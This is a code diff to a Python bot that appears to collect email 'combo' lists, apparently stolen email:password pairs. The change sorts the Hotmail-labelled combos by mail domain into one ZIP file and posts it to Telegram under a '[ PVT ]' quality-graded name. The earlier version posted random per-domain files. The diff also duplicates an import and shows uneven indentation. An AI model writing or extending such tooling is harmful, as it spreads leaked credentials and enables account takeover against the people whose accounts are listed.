@@ -15,7 +15,9 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 import aiohttp
+import zipfile
 import concurrent.futures
+import zipfile
 from mailhub import MailHub
 
 import discord
@@ -507,7 +509,7 @@ async def monitor_loop():
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
 
-                            # Post 1-3 random domain sorted files (hotmail only)
+                            # Post sorted domains ZIP (hotmail only)
                             if label == "hotmail":
                                 try:
                                     domain_map = {}
@@ -518,17 +520,17 @@ async def monitor_loop():
                                                 domain_map.setdefault(domain, []).append(combo)
                                         except Exception:
                                             pass
-                                    domain_map = {d: c for d, c in domain_map.items() if len(c) >= 50}
-                                        num_domains = random.randint(1, min(3, len(domain_map)))
-                                        picked = random.sample(list(domain_map.keys()), num_domains)
-                                        for domain in picked:
-                                            combos = domain_map[domain]
-                                            dfname = f"[ PVT ] [ {quality} ] [ {len(combos)} ] [ {domain.upper()} ].txt"
-                                            await send_telegram_file(tg_header + "\n".join(combos), dfname)
-                                            await asyncio.sleep(0.5)
-                                        log.info(f"Posted {num_domains} domain file(s): {picked}")
+                                    if domain_map:
+                                        zip_buf = io.BytesIO()
+                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                                            for domain, combos in domain_map.items():
+                                                zf.writestr(f"{domain}.txt", "\n".join(combos))
+                                        zip_buf.seek(0)
+                                        zip_name = f"[ PVT ] [ {quality} ] [ SORTED DOMAINS ].zip"
+                                        await send_telegram_file(zip_buf.read(), zip_name)
+                                        log.info(f"Posted sorted domains ZIP with {len(domain_map)} domain(s)")
                                 except Exception as e:
-                                    log.error(f"Failed to post domain files: {e}")
+                                    log.error(f"Failed to post domains ZIP: {e}")
 
                             if toggles["telegram_public"]:
                                 private_post_count_ref = globals()
